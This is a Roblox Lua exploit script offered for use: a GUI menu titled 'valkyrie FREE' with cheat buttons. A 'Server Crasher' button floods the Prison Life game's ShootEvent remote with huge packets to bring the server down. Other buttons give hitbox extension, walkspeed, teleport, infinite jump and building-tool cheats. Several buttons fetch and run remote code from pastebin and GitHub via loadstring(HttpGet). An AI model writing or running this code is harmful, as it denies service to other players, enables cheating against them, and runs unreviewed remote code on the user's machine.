-- yas
local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()

local X = Material.Load({
    Title = "valkyrie FREE by stryder#0009",
    Style = 2,
    SizeX = 500,
    SizeY = 350,
    Theme = "Aqua",
    ColorOverrides = {
        MainFrame = Color3.fromRGB(35,35,35)
    }
})


local Z = X.New({
    Title = "Server Crasher"
})

local A = Z.Button({
    Text = "Prison life",
    Callback = function()
        
        local Players = game:GetService("Players") 
        local RStorage = game:GetService("ReplicatedStorage")
        local SendCrash = RStorage:WaitForChild("ShootEvent")
        local packetamount = 5000
        local packetsend = 150
        local bulletlength = math.huge  
        local Tool = "Remington 870"  
        
        function getCrashTool()
        local Player = Players.LocalPlayer 
        local Backpack = Player:FindFirstChild("Backpack")
        workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Tool].ITEMPICKUP)
        return Backpack:FindFirstChild(Tool)
        end
        
        function crash()
        local CrashTable = { }
        for i=1, packetamount do 
        CrashTable[i] = {
        Cframe = CFrame.new(),
        Distance = bulletlength }
        end
        for i=1, packetsend do 
        SendCrash:FireServer(CrashTable,getCrashTool())
        end
        end
        
        crash()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "crash prison life"
            })
        end
    }
})

local Z = X.New({
    Title = "Combat"
})


local A = Z.Button({
    Text = "Hitbox extender",
    Callback = function()
        
        _G.HeadSize = 10
        _G.Disabled = true
    
        game:GetService('RunService').RenderStepped:connect(function()
            if _G.Disabled then
                for i,v in next, game:GetService('Players'):GetPlayers() do
                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                        pcall(function()
                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
                            v.Character.HumanoidRootPart.CanCollide = false
                        end)
                    end
                end
            end
        end)
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "enable hitboxes"
            })
        end
    }
})

local A = Z.Button({
    Text = "Reset Hitbox",
    Callback = function()
        
        _G.HeadSize = 5
        _G.Disabled = true
    
        game:GetService('RunService').RenderStepped:connect(function()
            if _G.Disabled then
                for i,v in next, game:GetService('Players'):GetPlayers() do
                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                        pcall(function()
                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
                            v.Character.HumanoidRootPart.CanCollide = false
                        end)
                    end
                end
            end
        end)    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "reset hitboxes"
            })
        end
    }
})

local Z = X.New({
    Title = "Radar"
})

local A = Z.Button({
    Text = "simple radar",
    Callback = function()
        
        loadstring(game:HttpGet("https://pastebin.com/raw/5YPGb6mJ", true))()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "2014 cheat styled radar"
            })
        end
    }
})

local A = Z.Button({
    Text = "radar",
    Callback = function()
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/PlayerRadar.luaJ", true))()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "default radar"
            })
        end
    }
})


local Z = X.New({
    Title = "FE scripts"
})

local A = Z.Button({
    Text = "Noob God [56]",
    Callback = function()
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/noob", true))()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "only works in r6 games"
            })
        end
    }
})

local A = Z.Button({
    Text = "Mad Wizard [R6]",
    Callback = function()
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/Wizard", true))()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "only works in R6 games"
            })
        end
    }
})

local A = Z.Button({
    Text = "Gangster [R6]",
    Callback = function()
        
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SomeExtraChips/f/main/gangster", true))()
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "only works in R6 games"
            })
        end
    }
})

local Z = X.New({
    Title = "Arceus X scripts"
})

local lod = Instance.new("Sound",workspace)
lod.Name = "load"
lod.SoundId = "rbxassetid://3997124966"
lod.Volume = 20
lod.Looped = false
 


local function NoclipLoop()

			for _, child in pairs(game.Players.LocalPlayer.Character.Reanimate:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
					child.CanCollide = false
				end
			end
end
	


local A = Z.Button({
    Text = "Walkspeed",
    Callback = function()
        
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed.Value = 70 
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "changer player walkspeed"
            })
        end
    }
})


local A = Z.Button({
    Text = "Reset Walkspeed",
    Callback = function()
        
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed.Value = 16
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "reset player walkspeed"
            })
        end
    }
})

local A = Z.Button({
    Text = "Teleport Tool",
    Callback = function()
        
        mouse = game.Players.LocalPlayer:GetMouse() 

        tool = Instance.new("Tool") 
        
        tool.RequiresHandle = false 
        
        tool.Name = "Teleport For Arceus X" 
        
        tool.Activated:connect(function() 
        
        local pos = mouse.Hit+Vector3.new(0,2.5,0) 
        
        pos = CFrame.new(pos.X,pos.Y,pos.Z) 
        
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos 
        
        end) 
        
        tool.Parent = game.Players.LocalPlayer.Backpack        
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "Teleport tool for arceus X"
            })
        end
    }
})

local A = Z.Button({
    Text = "Infinite Jump",
    Callback = function()
        
        local Humanoid = script.Parent:FindFirstChild("Humanoid")
        local UserInputService = game:GetService("UserInputService")
        local Key = Enum.KeyCode.Space
        local Holding = false
         
        UserInputService.InputBegan:Connect(function(Input)
            if Input.KeyCode == Key then
                Holding = true
                while Holding == true do
                    wait()
                    Humanoid:ChangeState(Enum.HumanoidStateType.Seated)
                    wait(0.0001)
                    Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
         
        UserInputService.InputEnded:Connect(function(Input)
            if Input.KeyCode == Key then
                Holding = false
            end
        end)
         
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "Infinite Jump"
            })
        end
    }
})

local A = Z.Button({
    Text = "Give Btools",
    Callback = function()
     Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4   
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "Give Btools"
            })
        end
    }
})

local A = Z.Button({
    Text = "Unlock workspace",
    Callback = function()
        rec = function(k)
            for _, Obj in pairs(k:GetChildren()) do
            if Obj:IsA("BasePart") then
            Obj.Locked = false
            end
            rec(Obj)
            end
            end
            
            rec(game.Workspace)
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "Unlock workspace for Btools"
            })
        end
    }
})

local A = Z.Button({
    Text = "Rejoin (used to disable scripts)",
    Callback = function()
            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
    end,
    Menu = {
        Information = function(self)
            X.Banner({
                Text = "Rejoin game"
            })
        end
    }
})
